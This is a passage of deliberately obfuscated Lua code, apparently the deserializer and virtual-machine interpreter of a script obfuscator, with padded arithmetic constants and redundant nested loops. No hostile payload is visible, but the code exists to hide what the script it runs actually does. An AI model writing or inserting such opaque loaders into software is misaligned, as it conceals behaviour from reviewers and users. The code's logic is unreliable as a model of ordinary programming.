177);v110=nil;v108=1;end if (v108==(1194 -(579 + 614))) then v111=nil;while true do if (v109~=(0 -0)) then else local v192=233 -(211 + 22);local v193;while true do if (v192~=0) then else v193=539 -(8 + 531);while true do if (v193~=0) then else v110=v21();v111=nil;v193=1 + 0;end if (v193==1) then v109=1454 -(619 + 834);break;end end break;end end end if ((2 -1)~=v109) then else if (v110==(2 -1)) then v111=v21()~=(1283 -(1126 + 157));elseif (v110==(2 + 0)) then v111=v24();elseif (v110~=(1928 -(500 + 1425))) then else v111=v25();end v46[v107]=v111;break;end end break;end end end v44[646 -(441 + 202)]=v21();for v112=1,v23() do local v113=0;local v114;local v115;local v116;while true do if (v113==1) then v116=nil;while true do if (v114==(1431 -(311 + 1120))) then local v195=0 + 0;while true do if (v195==(1626 -(494 + 1131))) then v114=2 -1;break;end if ((0 + 0)==v195) then v115=0;v116=nil;v195=1 -0;end end end if (v114==1) then while true do if (0==v115) then v116=v21();if (v20(v116,2 -1,253 -(191 + 61))==0) then local v214=0 -0;local v215;local v216;local v217;local v218;local v219;while true do if (v214==(325 -(69 + 256))) then v215=0 + 0;v216=nil;v214=58 -(5 + 52);end if (v214==(1 + 1)) then v219=nil;while true do if ((1 -0)==v215) then local v283=0 -0;while true do if (1==v283) then v215=1051 -(231 + 818);break;end if (v283==(0 + 0)) then v218=nil;v219=nil;v283=1;end end end if (v215==(6 -4)) then while true do if (v216==(242 -(156 + 84))) then local v286=0 + 0;while true do if (v286~=1) then else v216=3 + 0;break;end if (v286==(0 + 0)) then if (v20(v218,1 -0,1 + 0)==(825 -(353 + 471))) then v219[2]=v46[v219[2]];end if (v20(v218,2,1526 -(517 + 1007))~=(4 -3)) then else v219[345 -(318 + 24)]=v46[v219[1935 -(953 + 979)]];end v286=1790 -(541 + 1248);end end end if (v216==(4 -3)) then local v287=0 + 0;local v288;while true do if (v287~=(1279 -(995 + 284))) then else v288=0;while true do if (v288==1) then v216=1 + 1;break;end if (v288~=(0 + 0)) then else local v308=1494 -(1323 + 171);while true do if (v308~=(1361 -(658 + 702))) then else v288=2 -1;break;end if (v308~=(0 + 0)) then else v219={v22(),v22(),nil,nil};if (v217==(0 + 0)) then local v313=0 -0;local v314;while true do if (v313~=(0 -0)) then else v314=0;while true do if (v314~=0) then else v219[3]=v22();v219[1 + 3]=v22();break;end end break;end end elseif (v217==1) then v219[3 + 0]=v23();elseif (v217==(2 -0)) then v219[3 -0]=v23() -((1940 -(736 + 1202))^(51 -35));elseif (v217==(7 -4)) then local v319=0 + 0;local v320;while true do if (v319==0) then v320=47 -(10 + 37);while true do if (v320==0) then v219[3]=v23() -(2^16);v219[12 -8]=v22();break;end end break;end end end v308=1 + 0;end end end end break;end end end if (v216==0) then local v289=1089 -(736 + 353);while true do if (1==v289) then v216=1 + 0;break;end if (v289~=(0 + 0)) then else local v301=0;while true do if (v301~=(0 + 0)) then else v217=v20(v116,9 -7,1162 -(232 + 927));v218=v20(v116,3 + 1,811 -(636 + 169));v301=1;end if (1==v301) then v289=1104 -(740 + 363);break;end end end end end if (v216~=3) then else if (v20(v218,3,14 -11)==(1908 -(1107 + 800))) then v219[710 -(591 + 115)]=v46[v219[4]];end v41[v112]=v219;break;end end break;end if (v215==(0 + 0)) then v216=0;v217=nil;v215=374 -(21 + 352);end end break;end if (v214~=(782 -(555 + 226))) then else v217=nil;v218=nil;v214=3 -1;end end end break;end end break;end end break;end if (v113==(0 -0)) then v114=0 -0;v115=nil;v113=1 + 0;end end end v40=907 -(839 + 65);end if (v40==(0 -0)) then v41={};v42={};v43={};v40=1;end v81=1;end end break;end end end break;end if (v39~=0) then else local v78=0 + 0;while true do if (v78~=(1892 -(1433 + 459))) then else v40=0 -0;v41=nil;v78=1;end if (v78==1) then v39=2 -1;break;end end end if (v39~=(1 -0)) then else local v79=0 -0;while true do if (v79==(187 -(124 + 63))) then v42=nil;v43=nil;v79=1 -0;end if (v79~=(1 + 0)) then else v39=1 + 1;break;end end end end break;end if ((6 -4)==v38) then v43=nil;v44=nil;v38=127 -(51 + 73);end if (v38==(1 + 2)) then v45=nil;v46=nil;v38=17 -13;end if (v38~=(1346 -(910 + 435))) then else v41=nil;v42=nil;v38=1 + 1;end end end v29=nil;v17=7;end if (3==v17) then v23=nil;function v23()local v47=500 -(457 + (112 -69));local v48;local v49;local v50;local v51;while true do if ((2 -1)==v47) then return (v51 * (6426802 + 10350414)) + (v50 * (111302 -45766)) + (v49 * (1919 -(406 + 1257))) + v48;end if (((299 + 40) -(92 + 247))==v47) then v48,v49,v50,v51=v1(v15,v18,v18 + ((1 + 3) -1));v18=v18 + ((10 -6) -0);v47=1812 -(465 + 1346);end end end v24=nil;v17=4;end if (v17==1) then v20=nil;function v20(v30,v31,v32)if v32 then local v65=0 -0;local v66;while true do if (v65==(394 -(37 + 357))) then v66=(v30/((4 -2)^(v31-(1 + 0))))%((1770 -(527 + 1241))^(((v32-(519 -(412 + 106))) -(v31-((1 -0) -0))) + (4 -3)));return v66-(v66%1);end end else local v67=(766 -426) -(73 + 267);local v68;while true do if (v67==((2375 -(171 + 223)) -(227 + 988 + 766))) then v68=(2 + 0)^(v31-(1 + 0));return (((v30%(v68 + v68))>=v68) and (1 + 0)) or (0 + 0);end end end end v21=nil;v17=2;end if (v17==7) then function v29(v33,v34,v35)local v52=v33[1];local v53=v33[2];local v54=v33[3];return function(...)local v69=0;local v70;local v71;local v72;local v73;local v74;while true do if (v69==0) then v70=1;v71= -1;v69=1;end if (v69==1) then v72={...};v73=v11("#",...) -1;v69=2;end if (3==v69) then A,B=v27(v10(v74));if  not A[1] then local v82=0;local v83;while true do if (v82==0) then v83=v33[4][v70] or "?";error("Script error at ["   .. v83   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end break;end if (v69==2) then v74=nil;function v74()local v84=v52;local v85=Const;local v86=v53;local v87=v54;local v88=v27;local v89={};local v90={};local v91={};for v96=440 -(133 + 307),v73 do if ((v96>=v87) or (94>(832 + 411))) then v89[v96-v87]=v72[v96 + (736 -((1738 -1126) + 123))];else v91[v96]=v72[v96 + 1 + (0 -0)];end end local v92=(v73-v87) + (1 -0);local v93;local v94;while true do local v97=0 -0;while true do if ((v97==0) or ((4568 -(17 + 25 + (1996 -(292 + 673))))<(210 + 1290))) then local v100=0;while true do if ((v100==(312 -(199 + 113))) or ((593 + 170)>=(860 + 2651))) then v93=v84[v70];v94=v93[4 -3];v100=1;end if ((606==(2349 -(326 + 1417))) and (v100==1)) then v97=1197 -(848 + 348);break;end end end if ((v97==(1 + 0)) or ((3338 -(158 + 7))==2017)) then if ((v94<=(36 -(1508 -(105 + 1381)))) or (((183 + 6340) -2934)<=(9580 -7414))) then if ((v94<=(1818 -(310 + 1502))) or ((2743 -(17 + 13))>(3027 + 1117))) then if ((v94<=(2 -0)) or ((5202 -(125 + 112))<=(19710 -15394))) then if ((v94<=(0 -0)) or (3046==(488 + 454))) then v91[v93[2]]=v34[v93[5 -2]];elseif ((v94>(3 -2)) or (((2246 -(39 + 115)) -1610)>1584)) then v91[v93[3 -1]]={};else local v119=0 -0;local v120;local v121;local v122;while true do if ((v119==0) or ((217 + 444)>=4398)) then v120=0;v121=nil;v119=763 -(611 + 151);end if ((v119==1) or ((1338 -650)>(1363 + 515))) then v122=nil;while true do if ((v120==1) or (4448<=973)) then while true do if ((v121==(312 -(54 + 258))) or ((9318 -4459)<(5874 -3880))) then v122=v93[1295 -(47 + 46 + 1200)];v91[v122](v12(v91,v122 + 1,v71));break;end end break;end if ((v120==0) or ((686 + 2171)>=(4530 + 55))) then v121=0 -0;v122=nil;v120=1645 -(1199 + 445);end end break;end end end elseif ((v94<=(8 -4)) or ((6551 -2395)==(8177 -4386))) then if ((v94>(11 -8)) or ((4599 -(189 + 447))<(1978 -((340 -98) + 256)))) then v91[v93[4 -2]]=v91[v93[5 -2]][v91[v93[4 + 0]]];else local v124=0 + 0;local v125;local v126;local v127;local v128;while true do if ((v124==((0 + 0) -0)) or ((8067 -(5741 -1901))<=(2269 + 1927))) then v125=0 -0;v126=nil;v124=1624 -(917 + 706);end if ((((1614 -(1087 + 137)) + 2923)>=(3234 -(215 + 42))) and (v124==(1 + 1 + 0))) then while true do if (((173 + 4364)==4537) and (v125==(1 + 0))) then v128=nil;while true do if ((((2472 -(1037 + 928)) + 715 + 115)>=341) and (v126==0)) then local v258=0 -0;local v259;while true do if ((v258==(497 -(184 + 313))) or (((3064 -(417 + 894)) + 1322)>3861)) then v259=0 -(0 -0);while true do if (((2419 -(318 + 572))<=(5439 -(381 + 276))) and (v259==(0 + 0))) then local v291=0 + 0;while true do if ((v291==(962 -(342 + 620))) or (1275>=4547)) then v127=v93[2];v128=v91[v127];v291=1;end if (((1 -(0 -0))==v291) or ((2374 -(2565 -1625))>=(15159 -11036))) then v259=3 -2;break;end end end if ((3474>=(1121 + 515)) and (1==v259)) then v126=4 -3;break;end end break;end end end if ((v126==(1 + 0)) or ((5631 -(483 + 156))<=(1329 + 1641))) then for v268=v127 + 1 + 0,v93[4 -1] do v7(v128,v91[v268]);end break;end end break;end if ((v125==(0 -0)) or (3056<=3039)) then v126=0;v127=nil;v125=1 + 0;end end break;end if ((((2986 -1774) -(961 + 31 + 219))==v124) or (3516>=(3247 + 1656))) then v127=nil;v128=nil;v124=2;end end end elseif ((v94>(9 -4)) or ((4304 -(206 + 1148))<=(3017 -(1537 + 118)))) then local v129=1210 -(994 + 216);local v130;local v131;local v132;local v133;while true do if (((4433 -(222 + 233))>(2906 -(1025 + 495))) and (v129==(0 + 0))) then local v198=0 -0;while true do if ((v198==(0 -(0 + 0))) or ((10784 -8332)>((2164 + 1288) -((1221 -(682 + 419)) + 395)))) then v130=(0 -0) -0;v131=nil;v198=1;end if ((v198==(681 -(545 + 135))) or ((4853 -1472)<=(1079 -((1518 -(215 + 1247)) + 481)))) then v129=1;break;end end end if ((v129==(2 -(672 -(659 + 12)))) or (2212>((17785 -(235 + 1280)) -11330))) then local v199=0 + (0 -0);while true do if (((5943 -((274 -146) + (3356 -2493)))>=(1740 + 862)) and (v199==(1 + 0))) then v129=2 -0;break;end if (((2933 -(742 + 335))>=332) and (v199==(0 + 0))) then v132=nil;v133=nil;v199=3 -(4 -2);end end end if ((v129==(1 + 1)) or (((125 -80) -25)>=(3749 -(414 + 505)))) then while true do if ((v130==(1844 -(230 + (5328 -3714)))) or (((9717 -(27 + 565)) -5741)<(89 + 249))) then local v220=269 -(187 + 82);while true do if (((19956 -(23801 -8489))>=((55 + 3106) -(78 + 1 + 0))) and (v220==(366 -(159 + 206)))) then v130=(10 -7) -2;break;end if (((10619 -7070)>=(4103 -(563 + 441))) and (v220==(0 -0))) then local v260=0 + 0;while true do if (((123 + 3334)>(19 -(1 + 8))) and (v260==(1 + 0))) then v220=1 + 0;break;end if ((v260==0) or (8>1480)) then v131=v93[2];v132=v91[v131];v260=1 + 0;end end end end end if (((1398 + 35)>=(29 -11)) and (((500 + 612) -(1103 + 8))==v130)) then v133=v91[v131 + (1609 -(1051 + 556))];if ((327<1458) and (v133>(976 -(434 + (1158 -616))))) then if (((2690 -(778 + 151 + 371))<=(2997 -(451 + (147 -37)))) and (v132>v91[v131 + 1 + 0])) then v70=v93[1 + 0 + 2];else v91[v131 + (519 -(503 + 13))]=v132;end elseif (((986 + 159 + 2909)==(5881 -(1435 + 392))) and (v132<v91[v131 + ((1655 -1071) -(116 + 467))])) then v70=v93[3];else v91[v131 + 1 + 2]=v132;end break;end end break;end end else local v134=0;local v135;local v136;local v137;local v138;local v139;while true do if ((v134==(2 -1)) or (((1832 -690) + 1444)<=(1357 + 971))) then local v200=0 + 0;while true do if ((2666>=(5686 -3908)) and ((1 + 0)==v200)) then v134=3 -1;break;end if ((v200==(1501 -(216 + 1285))) or ((4299 -(217 + 68))>(5819 -(843 + 459)))) then v137=nil;v138=nil;v200=2 -1;end end end if (((954 -(155 + 797))==v134) or ((79 + 1014)>=1651)) then v139=nil;while true do if ((v135==(0 + (0 -0))) or ((3942 -1485)<=2226)) then local v221=0 + 0;while true do if ((v221==0) or ((1755 + 701)<1093)) then local v261=0;while true do if ((2896>1890) and (0==v261)) then v136=v93[1 + 1];v137,v138=v88(v91[v136](v12(v91,v136 + 1,v93[148 -((695 -(265 + 352)) + 67)])));v261=1 + 0;end if ((v261==1) or (3826<=(737 + 482))) then v221=2 -1;break;end end end if ((v221==1) or ((2764 -(11 + (1435 -(992 + 371))))<674)) then v135=1;break;end end end if (((2915 -1509)<=(5336 -(103 + 1437))) and ((2 + 0)==v135)) then for v233=v136,v71 do local v234=0 -0;local v235;local v236;while true do if ((v234==(592 -(435 + 157))) or ((3004 -1993)>=(7832 -2863))) then v235=1069 -(83 + (1873 -(472 + 415)));v236=nil;v234=1 + 0;end if (((1197 + (1564 -(1030 + 321)))<(1327 + 3454)) and (v234==(1 + 0))) then while true do if ((1975>=(563 -385)) and (v235==(0 -0))) then v236=0 + 0;while true do if ((v236==0) or ((3492 -(250 + 779))>=(3085 -(238 + (508 -283))))) then v139=v139 + (3 -2);v91[v233]=v137[v139];break;end end break;end end break;end end end break;end if ((511<((6880 -5039) + 667 + 2101)) and (v135==(2 -(315 -(13 + 301))))) then local v222=0;while true do if ((v222==(1616 -(431 + 1185))) or ((6393 -3940)<(1178 + 63 + 13))) then local v262=0 + 0;while true do if ((((3788 + 418) -(206 + 135))>(3638 -662)) and ((0 + 0)==v262)) then v71=(v138 + v136) -(1300 -(128 + (2215 -(844 + 200))));v139=0;v262=1 + 0;end if ((v262==1) or ((4381 -(155 + 1646))<=(5301 -3669))) then v222=(1466 -(214 + 1249)) -2;break;end end end if (((408 + 2986)==3394) and (v222==1)) then v135=883 -(251 + 630);break;end end end end break;end if ((v134==(1190 -(650 + 12 + 528))) or ((2783 + 333)>(18614 -14246))) then local v201=1049 -(451 + 598);while true do if ((v201==(1832 -((1490 -814) + 517 + 639))) or ((3476 -1521)<1096)) then v135=0 -0;v136=nil;v201=1 + (1970 -(346 + 1624));end if ((((8765 -(885 + 880)) -3942)>=(395 + 5)) and (v201==(471 -(346 + 124)))) then v134=1839 -(123 + 1715);break;end end end end end elseif ((v94<=((34 + 1380) -(290 + 105 + (2966 -(101 + 1856))))) or (2693<=(751 -(188 + 251)))) then if (((1300 -(149 + 160))==(2907 -(1193 + 723))) and (v94<=(21 -(17 -4)))) then if ((((87 + 3720) -1943)<(4861 -(56 + 31))) and (v94==(62 -(12 + 43)))) then if (((1534 -((390 -(67 + 277)) + 60))<(3117 -1386)) and (v93[4 -2]==v91[v93[4 -0]])) then v70=v70 + 1;else v70=v93[3];end else v91[v93[2 + 0]]=v91[v93[7 -4]][v93[495 -((1034 -(820 + 108)) + 385)]];end elseif ((v94>(28 -19)) or (((2482 + 2856) -(1170 + 113))==2464)) then local v141=0 + 0 + 0;local v142;local v143;local v144;while true do if ((v141==(7 -(2 + 3))) or (1667>=(2740 + 94))) then if ((v143>(0 -0)) or ((2595 -(293 + 160))>=(5381 -(332 + 278)))) then if ((v144<=v91[v142 + 1]) or ((2 + 1423)>=2989)) then local v237=1327 -(92 + 1235);local v238;while true do if ((v237==((1864 -(1108 + 756)) + 0)) or ((10792 -6257)<=311)) then v238=(2388 -(468 + 597)) -(899 + (1964 -(1001 + 539)));while true do if ((v238==(0 -0)) or (1208>=(1435 + 395))) then v70=v93[1007 -(212 + 792)];v91[v142 + (7 -4)]=v144;break;end end break;end end end elseif ((v144>=v91[v142 + 1 + 0]) or (4855<=(2331 -1683))) then local v239=0;while true do if ((v239==(286 -(54 + 232))) or ((3959 -(2692 -(357 + 108)))>=(4166 -(19 + 1362)))) then v70=v93[3 + 0];v91[v142 + 3 + 0]=v144;break;end end end break;end if ((v141==(0 + 0)) or ((3142 -2091)==(4980 -(1262 + 52 + 438)))) then local v202=0 -0;while true do if ((v202==(785 -(468 + (1390 -(205 + 868))))) or ((1855 + 1968)<=530)) then v142=v93[2];v143=v91[v142 + 1 + 1];v202=3 -2;end if (((1048 -(778 + 269))==v202) or ((197 + 736)>=(5188 -(310 + (2374 -(1269 + 293)))))) then v141=832 -(252 + 579);break;end end end if ((v141==(1 + 0)) or ((3391 -1050)>=(2231 + 933))) then local v203=(0 + 0) -(0 + 0);while true do if (((6869 -(1015 + 923))>=1425) and (v203==0)) then v144=v91[v142] + v143;v91[v142]=v144;v203=1;end if ((4174<(8606 -(5188 -(637 + 707)))) and (v203==(655 -(215 + 439)))) then v141=2 -0;break;end end end end else v91[v93[4 -(69 -(66 + 1))]]=v93[3];end elseif ((((7768 -4241) -(32 + 136))>=2212) and (v94<=(16 -4))) then if ((v94>((895 -506) -(200 + 178))) or ((6196 -(958 + 368))<(587 + 193))) then local v146=0;local v147;local v148;while true do if ((v146==(0 -0)) or ((749 -(144 + 83))==3452)) then local v204=0;while true do if ((v204==(0 -0)) or ((5044 -2507)==(4426 -(18 + 9)))) then v147=v93[1 + 1];v148={};v204=(881 -(372 + 507)) -1;end if ((v204==(2 -1)) or ((5021 -((754 -(136 + 607)) + 282))<=4307)) then v146=1643 -(751 + 891);break;end end end if ((((7937 -5560) + 234)>=((3002 + 759) -2224)) and (v146==1)) then for v208=765 -(67 + (1052 -355)), #v90 do local v209=0 -0;local v210;local v211;while true do if ((4315<(6037 -(258 + 898))) and (v209==1)) then while true do if ((v210==(0 -0)) or ((4663 -(1054 + 58))==(715 -(326 + (1659 -1282))))) then v211=v90[v208];for v275=0 -0, #v211 do local v276=0 -0;local v277;local v278;local v279;local v280;local v281;while true do if ((1945<4997) and (v276==(792 -(363 + 429)))) then v277=1226 -(200 + 1026);v278=nil;v276=1;end if ((v276==(1894 -(1790 + 103))) or ((4310 -((2711 -(626 + 1317)) + 908))>=(3346 + 478))) then v279=nil;v280=nil;v276=2 + 0;end if ((v276==(1919 -((2994 -(650 + 455)) + (48 -20)))) or ((1737 -(30 + 262))>(4155 + 731))) then v281=nil;while true do if ((3985>((2042 -946) + (1859 -968))) and (v277==1)) then local v298=0 + 0;while true do if ((1483==(2856 -1373)) and ((1 + 0)==v298)) then v277=3 -1;break;end if ((v298==(0 + 0)) or ((1547 + 1058)<=(3910 -1874))) then v280=nil;v281=nil;v298=(1 + 1) -1;end end end if ((v277==2) or ((2434 -(298 + 1399))>=(1307 + 1512))) then while true do if ((v278==(1683 -(289 + 1394))) or (((479 -214) + 335)>=(13528 -10076))) then local v306=1154 -(940 + 214);local v307;while true do if ((((2151 -868) + 2476)<=4206) and (v306==0)) then v307=0 -0;while true do if ((4257>=(5961 -3741)) and (v307==(1 + 0))) then v278=1 + 0;break;end if ((v307==(0 -0)) or (((7157 -(1122 + 397)) -((4388 -3507) + 351))<=2807)) then v279=v211[v275];v280=v279[1];v307=3 -2;end end break;end end end if ((v278==(1 + 0 + 0)) or ((1891 + 1022)<(2609 -(144 + 665 + 167)))) then v281=v279[2];if ((2233<(4533 -(45 + 1852))) and (v280==v91) and (v281>=v147)) then local v309=0 + 0;while true do if (((1734 + 84)<=(368 + (3768 -(130 + 787)))) and ((0 -0)==v309)) then v148[v281]=v280[v281];v279[1 + (0 -0)]=v148;break;end end end break;end end break;end if (((12962 -8596)>((1230 -510) -522)) and ((353 -((851 -533) + 35))==v277)) then local v299=0 + 0;while true do if ((v299==(320 -(78 + 242))) or ((3507 -(860 + 414))>=(7327 -4639))) then v278=0 -0;v279=nil;v299=3 -(1 + 1);end if (((1 + 0)==v299) or (2886>(4940 -(156 + 1382)))) then v277=(774 -561) -(75 + 137);break;end end end end break;end end end break;end end break;end if ((((706 + 984) -(631 + 641))<=(3072 -2256)) and (0==v209)) then local v240=793 -(30 + 763);while true do if (((0 + 0)==v240) or ((404 + 66)<=(1045 -(209 + 475)))) then v210=1949 -(1015 + 934);v211=nil;v240=1 + (254 -(224 + 30));end if (((8753 -4655)<((5354 -(72 + 48)) -(704 + 105))) and (v240==1)) then v209=1 -0;break;end end end end end break;end end else local v149=0 -0;local v150;local v151;local v152;while true do if ((v149==((306 -(61 + 244)) + 0)) or ((1276 + 3115)<1559)) then v152=nil;while true do if ((v150==(1639 -(1603 + 35))) or (((6057 -2143) -(286 + 188))<2348)) then while true do if ((v151==(0 -0)) or ((5703 -(1063 + 723))<=(4578 -2290))) then v152=v93[(2027 -843) -(424 + 758)];v91[v152]=v91[v152](v12(v91,v152 + (2 -1),v71));break;end end break;end if (((441 + 417)<2382) and (v150==(0 -0))) then v151=0;v152=nil;v150=722 -(286 + (1101 -666));end end break;end if (((570 + 2050)>41) and (v149==(0 -0))) then v150=0;v151=nil;v149=1 + 0;end end end elseif ((v94>(1593 -(559 + 1021))) or ((1982 -(47 + 501))<486)) then local v153=0 -0;local v154;local v155;local v156;while true do if ((v153==(3 -2)) or ((4578 -2035)<469)) then v156=nil;while true do if ((v154==(1063 -(846 + 217))) or ((782 -(318 + 224))>(2812 -650))) then local v224=1531 -(33 + 1498);while true do if (((10103 -6660)>(3487 -2410)) and (v224==(312 -(77 + 235)))) then v155=0;v156=nil;v224=1 -0;end if ((2066<=(15622 -11515)) and (v224==(961 -(523 + 437)))) then v154=1406 -(252 + 1153);break;end end end if ((v154==1) or ((605 + 1697)<(4008 -2031))) then while true do if ((v155==(704 -(92 + 612))) or ((8771 -(19111 -13132))<577)) then v156=v93[2 + 0];v91[v156](v91[v156 + (2 -1)]);break;end end break;end end break;end if ((v153==(0 + 0)) or ((4276 -(110 + 951))<2446)) then v154=0;v155=nil;v153=1 + 0;end end else local v157=0 -0;local v158;local v159;local v160;local v161;local v162;local v163;while true do if ((1565<=((34944 -21757) -9199)) and (v157==(1 -0))) then v160=nil;v161=nil;v157=2;end if ((v157==(0 -0)) or ((1856 + 427)>(4887 -(491 + 353)))) then v158=0 + 0;v159=nil;v157=1;end if ((v157==(69 -(31 + 36))) or ((6110 -3627)>=4552)) then v162=nil;v163=nil;v157=13 -10;end if (((5 -2)==v157) or ((4273 -((1249 -809) + 669))>=(13690 -9990))) then while true do if ((v158==(1 + 0)) or ((5416 -(669 + 314))==1059)) then local v225=0;while true do if (((1 + 0)==v225) or (4330<=((11675 -6052) -2391))) then v158=(1849 -(559 + 1285)) -3;break;end if ((v225==(1103 -(629 + 474))) or ((486 + 1210)>(1625 + 1044))) then v161=nil;v162=nil;v225=(2028 -(384 + 713)) -(890 + 40);end end end if ((v158==((139 + 684) -(363 + 458))) or ((4753 -(591 + 203))>(932 + 3198))) then v163=nil;while true do if ((v159==(1 -0)) or ((2684 + (2759 -(478 + 541)))<=550)) then local v264=0 -0;local v265;while true do if (((188 + 1059)==(2966 -(1464 + 255))) and (v264==(0 + (135 -(73 + 62))))) then v265=(1535 -(842 + 693)) + 0;while true do if (((3485 -1889)==(815 + 781)) and (v265==(313 -(119 + 194)))) then v71=(v162 + v160) -(963 -(679 + 283));v163=0;v265=1 -0;end if ((v265==(2 -1)) or (4710<=(2755 -1750))) then v159=(2097 -(544 + 380)) -(680 + 491);break;end end break;end end end if ((v159==(5 -3)) or ((3331 -(186 + 4))==3883)) then for v272=v160,v71 do local v273=0;local v274;while true do if ((v273==(533 -(436 + 97))) or ((16291 -11757)<(112 + 146 + 802))) then v274=0 -0;while true do if ((v274==(1550 -(902 + 648))) or ((2670 -(1004 + 318))>3867)) then v163=v163 + (1 -(0 -0));v91[v272]=v161[v163];break;end end break;end end end break;end if (((1689 -((1201 -662) + 958))<=(14636 -9769)) and (v159==(1233 -(832 + 401)))) then local v266=0 + 0;local v267;while true do if ((1270>=24) and (v266==(0 -0))) then v267=0;while true do if (((693 + 604)<=(2986 -(334 + 235))) and (v267==(0 + 0))) then v160=v93[6 -4];v161,v162=v88(v91[v160](v91[v160 + (3 -2)]));v267=1;end if ((3602>(2440 -(349 + 85))) and (v267==1)) then v159=(2 -1) + 0;break;end end break;end end end end break;end if (((0 -0)==v158) or (2835>=(8852 -4804))) then v159=0 + 0;v160=nil;v158=(1 + 1) -1;end end break;end end end elseif (((4823 -1508)>(1756 + 96)) and (v94<=(12 + 10))) then if ((v94<=(5 + 13)) or ((6564 -(1274 + 687))<2403)) then if (((9788 -6434)<=(5554 -(892 + 820))) and (v94<=(74 -58))) then if ((1037<(3746 -(132 + 874))) and (v94>(14 + 1))) then if (v91[v93[5 -3]] or ((8168 -3249)==(4254 -(338 + 873)))) then v70=v70 + (1594 -(697 + 896));else v70=v93[2 + 1];end elseif (((3118 -((31 -21) + 14))>=((646 + 62) -339)) and (v91[v93[3 -1]]==v93[4 + 0])) then v70=v70 + ((1 + 0) -0);else v70=v93[1283 -(1012 + 268)];end elseif (((5370 -2652)<=(4966 -(657 + 979))) and (v94==(3 + 4 + 10))) then for v196=v93[(130 + 23) -(69 + 82)],v93[1 + 2] do v91[v196]=nil;end else do return;end end elseif (((493 -330)<=(5602 -3633)) and (v94<=(39 -19))) then if ((v94==(6 + 13)) or ((1948 -(1245 + 270))==4709)) then local v164=0 -0;local v165;local v166;local v167;local v168;while true do if ((v164==(4 -2)) or (4769<=(660 + 3800))) then while true do if (((0 + 0 + 0)==v165) or (((1233 + 4734) -(785 + 944))<=4123)) then v166=v86[v93[1 + 2]];v167=nil;v165=1583 -(1286 + 296);end if ((v165==(828 -(336 + 490))) or (1228>1983)) then for v241=783 -(395 + 387),v93[1778 -(762 + 1012)] do local v242=0 -0;local v243;local v244;local v245;while true do if (((2475 + 2420)>=1188) and (v242==1)) then v245=nil;while true do if ((v243==(1 + 0)) or ((2625 -(1587 + 194))>=3484)) then while true do if ((v244==(1514 -(139 + 1374))) or ((6821 -4837)>=(3986 -(160 + 693)))) then if ((v245[3 -2]==23) or ((3429 -1431)<67)) then v168[v241-(437 -(147 + 289))]={v91,v245[3 -0]};else v168[v241-((1403 -593) -(578 + 231))]={v34,v245[13 -10]};end v90[ #v90 + (1250 -(1187 + 62))]=v168;break;end if ((4712==(5937 -1225)) and (v244==(0 -0))) then local v295=914 -(848 + 66);local v296;while true do if (((1013 + 3216)>(119 + 2327)) and (v295==(805 -(715 + 90)))) then v296=0 + 0;while true do if ((v296==(2 -1)) or ((2728 -(423 + 836))>=(2664 + 126))) then v244=1;break;end if (((5493 -(901 + 431))>=(5741 -4052)) and (v296==(0 + 0))) then local v310=0 + 0;while true do if ((1182==(626 + 556)) and (v310==(1 + 0))) then v296=953 -(95 + 857);break;end if ((v310==(1247 -((2299 -1273) + 111 + 110))) or ((1006 + 696)>(475 + 1240))) then v70=v70 + (1463 -(1242 + (604 -(104 + 280))));v245=v84[v70];v310=1 + 0;end end end end break;end end end end break;end if ((1707>=(2753 -(1029 + 695))) and (v243==(0 + 0 + 0))) then v244=(0 -0) -0;v245=nil;v243=1761 -((2653 -(846 + 919)) + 872);end end break;end if (((7770 -3772)>(176 + 322)) and ((756 -(118 + 638))==v242)) then v243=0 -0;v244=nil;v242=1;end end end v91[v93[2]]=v29(v166,v167,v35);break;end if (((7002 -(5500 -(655 + 555)))<(12697 -9373)) and (v165==(1 -0))) then v168={};v167=v9({},{__index=function(v246,v247)local v252=0 + 0;local v253;local v254;local v255;while true do if ((v252==(1 + (435 -(267 + 168)))) or ((18431 -13752)>(1920 + 3058))) then v255=nil;while true do if (((2643 -1382)>=377) and (v253==1)) then while true do if ((2376>(1652 + 403)) and (v254==(0 + 0))) then local v300=574 -(209 + 37 + 328);while true do if (((3585 -(28 + 757))<=(6575 -2697)) and (0==v300)) then v255=v168[v247];return v255[1499 -(724 + 774)][v255[2]];end end end end break;end if ((v253==(0 -0)) or ((508 + 124)>=(2653 -(2337 -1390)))) then local v285=(904 -(14 + 890)) -0;while true do if ((v285==(1012 -(614 + 397))) or (((10345 -2759) -4510)==(735 + 697))) then v253=1;break;end if ((v285==(0 -0)) or ((3560 -2788)>(3213 -(437 + 34)))) then v254=934 -(114 + 820);v255=nil;v285=2 -1;end end end end break;end if ((0==v252) or ((4557 -1709)<=(246 + 964))) then v253=980 -(755 + 225);v254=nil;v252=1 + 0;end end end,__newindex=function(v248,v249,v250)local v256=0;local v257;while true do if ((v256==(1833 -(1574 + 259))) or ((2337 -1428)<(2952 -(679 + 1603)))) then v257=v168[v249];v257[4 -3][v257[1 + 1]]=v250;break;end end end});v165=2;end end break;end if (((1 + 0)==v164) or ((1363 -(48 + 352))>=1224)) then v167=nil;v168=nil;v164=(1 -0) + 1;end if ((497<=((20726 -9553) -7749)) and (v164==(0 -0))) then v165=0;v166=nil;v164=2 -1;end end else local v169=0;local v170;while true do if (((98 + (1624 -1238))==(946 -462)) and (v169==(0 + 0))) then v170=v93[6 -(5 -1)];v91[v170]=v91[v170](v91[v170 + 1]);break;end end end elseif ((v94>(84 -63)) or ((53 + 1664)<=(5005 -3336))) then local v171=0 + 0;local v172;local v173;local v174;while true do if ((4108>(1475 + 167)) and (v171==0)) then v172=0;v173=nil;v171=1935 -(607 + 1327);end if (((6174 -(556 + 3448))>1739) and (v171==(1 -0))) then v174=nil;while true do if ((((1474 + 1218) -(842 + 214))<=(12969 -8143)) and (v172==(198 -(157 + 41)))) then local v227=735 -(646 + 89);while true do if ((v227==0) or ((1962 + 788)<=339)) then v173=v93[165 -(125 + 37)];v174=v91[v173];v227=1 + 0;end if ((v227==(615 -(256 + 358))) or ((6412 -(1198 + 425))<(782 + 1139))) then v172=2 -(1 -0);break;end end end if ((v172==(1024 -(897 + 126))) or (2483==788)) then for v251=v173 + 1 + 0,v93[1637 -(74 + 1559)] do v174=v174   .. v91[v251];end v91[v93[2 + 0]]=v174;break;end end break;end end else v70=v93[6 -(1104 -(113 + 988))];end elseif (((1638 + 1129)<=(104 + (6134 -(1008 + 854)))) and (v94<=(1510 -(741 + 743)))) then if (((2322 -1331)<=(5316 -(196 + 429))) and (v94<=(303 -(196 + 83)))) then if ((v94>(1 + 22)) or ((2069 -658)>=(5235 -(757 